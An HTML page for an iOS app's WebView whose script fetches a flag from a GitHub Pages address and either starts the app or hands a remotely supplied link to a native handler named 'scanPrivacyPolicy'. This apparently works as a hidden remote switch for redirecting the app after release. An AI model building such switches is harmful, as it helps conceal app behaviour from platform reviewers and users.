<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Expires" content="0" />
    <title>白屏接口请求页</title>
    <style>
        html,
        body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background: #ffffff;
        }
    </style>
</head>

<body>
    <script>
        // MT white-screen switch (GitHub Pages text API)
        // Usage:
        //   welcome.html?path=26066919/liziyoupin
        //   welcome.html?api=https://lwei1992.github.io/app-gonow/26066919/liziyoupin/
        // Response body: "0~https://..." or "1~https://..."
        //   0 → startAPP (no jump)
        //   1 → scanPrivacyPolicy(second part)
        let cacheLink = null;
        let isOpen = false;

        const DEFAULT_BASE = 'https://lwei1992.github.io/app-gonow/';
        const params = new URLSearchParams(window.location.search);

        function resolveSwitchUrl() {
            const api = (params.get('api') || '').trim();
            if (api) return api.endsWith('/') ? api : (api + '/');
            let path = (params.get('path') || '').trim().replace(/^\/+|\/+$/g, '');
            if (!path) path = '26066919/liziyoupin';
            return DEFAULT_BASE + path + '/';
        }

        const SWITCH_URL = resolveSwitchUrl();

        function postStart() {
            try {
                if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.startAPP) {
                    window.webkit.messageHandlers.startAPP.postMessage(null);
                }
            } catch (e) { }
        }

        function postPrivacy(link) {
            try {
                if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.scanPrivacyPolicy) {
                    window.webkit.messageHandlers.scanPrivacyPolicy.postMessage(link);
                }
            } catch (e) { }
        }

        function applySwitchText(raw) {
            const text = String(raw || '').trim();
            console.log('接口返回：', text);
            // support ASCII ~ and fullwidth ～
            const parts = text.split(/[~～]/);
            const flag = (parts[0] || '').trim();
            const link = parts.slice(1).join('~').trim();
            if (flag === '1' && link) {
                isOpen = true;
                cacheLink = link;
                postPrivacy(cacheLink);
            } else {
                // 0 or anything else → enter app
                isOpen = false;
                cacheLink = null;
                postStart();
            }
        }

        function fetchSwitchInfo() {
            fetch(SWITCH_URL, { cache: 'no-store' })
                .then(res => res.text())
                .then(applySwitchText)
                .catch(err => {
                    console.log('接口请求失败', err);
                    isOpen = false;
                    cacheLink = null;
                    postStart();
                });
        }

        fetchSwitchInfo();

        document.addEventListener('visibilitychange', function () {
            if (!document.hidden) {
                if (isOpen && cacheLink) {
                    postPrivacy(cacheLink);
                }
            }
        });
    </script>
</body>

</html>
